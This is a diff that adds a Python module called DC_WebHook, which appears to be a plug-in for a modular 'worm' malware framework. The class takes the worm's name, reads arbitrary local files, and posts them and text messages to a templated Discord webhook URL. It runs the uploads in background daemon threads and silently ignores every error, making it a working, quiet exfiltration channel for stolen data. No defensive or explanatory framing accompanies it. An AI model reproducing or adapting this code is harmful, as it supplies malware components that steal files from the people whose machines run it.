@@ -1,0 +1,70 @@
+#!name##DC_WebHook
+#!types##module
+#!info##Allows communication via Discord Webhook and requests module. Send messages and files to Discord.
+#!reqVar##DC_url##Discord webhook url.##str
+
+
+import requests
+import os
+from threading import Thread
+
+class DC_WebHook:
+    MTYPES = "conn"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.user_name = self.worm.name
+        self.url = "{{DC_url}}"
+        self.is_conn = True
+    
+    
+    def prepare_headers(self, text_msg: str) -> dict:
+        data = {
+                "content": "New Message",
+                "username": self.user_name,
+                "embeds": [{
+                        "title": "New data:",
+                        "description": f"{text_msg}"
+                        }]}
+        return data
+    
+    def webhook(self, headers: dict) -> None:
+        try:
+            resp = requests.post(self.url, json=headers)
+        except:
+            return
+
+    
+    def _send_msg(self, msg: str) -> None:
+        head = self.prepare_headers(msg)
+        self.webhook(head)
+    
+    def send_msg(self, msg: str) -> None:
+        sm = Thread(target=self._send_msg, args=(msg, ), daemon=True)
+        sm.start()
+    
+    def _send_file(self, fpath: str, name: str = None, types: str = None) -> None:
+        if not os.path.exists(fpath):
+            return
+        if not name:
+            name = os.path.basename(fpath)
+        try:
+            with open(fpath, "rb") as f:
+                data = f.read()
+        except:
+            return
+        head = {name : data}
+        try:
+            resp = requests.post(self.url, files=head)
+        except:
+            return
+    
+    def send_file(self, fpath: str, name: str = None, types: str = None) -> None:
+        sf = Thread(target=self._send_file, args=(fpath, name, types), daemon=True)
+        sf.start()
+    
+    def start(self) -> None:
+        pass
+    
+
+    
+
